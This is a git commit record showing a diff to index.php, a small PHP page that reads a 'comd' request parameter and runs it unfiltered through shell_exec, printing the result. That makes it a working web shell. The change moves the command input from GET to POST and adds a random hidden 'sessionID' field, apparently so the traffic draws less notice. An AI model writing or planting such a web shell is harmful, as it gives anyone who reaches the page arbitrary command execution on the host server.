895c47da4a98a443be66ce3ba7fdb0878ddebf04
Dz@shell <36556358+termux4me@users.noreply.github.com>
2019-09-20 00:36:02 +0100

    Update index.php

--- index.php
+++ index.php
@@ -1,10 +1,11 @@
 <?php
-$p=$_GET['comd'];
+$p=$_POST['comd'];
+$r=rand(0,2020);
 echo '
 <table style="text-align:center; width:70%; margin-left:15%; margin-top:50%; margin-right:15%;">
 <tr>
 <td>
-<form action="/" method="GET"><input name="comd" value="" type="text"></form>
+<form action="/" method="POST"><input name="comd" value="" type="text"><form action="/" method="GET"><input name="sessionID" value="' . "$r" . '" type="hidden"></form></form>
 ';
 echo shell_exec("$p");
 echo '
